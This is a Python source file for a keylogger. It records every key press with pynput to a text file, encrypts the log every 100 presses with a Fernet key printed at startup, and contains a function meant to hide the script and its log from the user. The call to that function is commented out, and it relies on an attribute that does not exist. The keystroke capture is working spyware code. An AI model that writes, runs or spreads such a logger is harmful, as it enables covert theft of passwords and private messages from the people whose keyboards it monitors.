import pynput.keyboard
from cryptography.fernet import Fernet
import os
import sys

log_file = "log.txt"

# Generate the encryption key
key = Fernet.generate_key()

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key} pressed\n")
        # Encrypt and log every 100 key presses
        global count
        count += 1
        if count % 100 == 0:
            encrypt_log()
    except Exception as e:
        print(f"Error: {str(e)}")

def encrypt_log():
    try:
        # Load the log file, encrypt its contents, and save it back
        with open(log_file, "r") as f:
            log_content = f.read().encode()
            cipher = Fernet(key)
            encrypted_content = cipher.encrypt(log_content)
        with open("encrypted_log.txt", "wb") as f:  # Save encrypted logs to a file
            f.write(encrypted_content)
    except Exception as e:
        print(f"Error encrypting log: {str(e)}")

def start_keylogger():
    try:
        with pynput.keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except Exception as e:
        print(f"Error starting keylogger: {str(e)}")

def hide_files():
    try:
        # Hide the keylogger and log file
        file_attributes = (getattr(os, 'FA_HIDDEN', 0),)
        os.chflags(log_file, *file_attributes)
        os.chflags(sys.argv[0], *file_attributes)
    except Exception as e:
        print(f"Error hiding files: {str(e)}")

if __name__ == "__main__":
    # Start the keylogger and additional cybersecurity threads
    print("Encryption key:", key)
    count = 0
    start_keylogger()
    #hide_files()

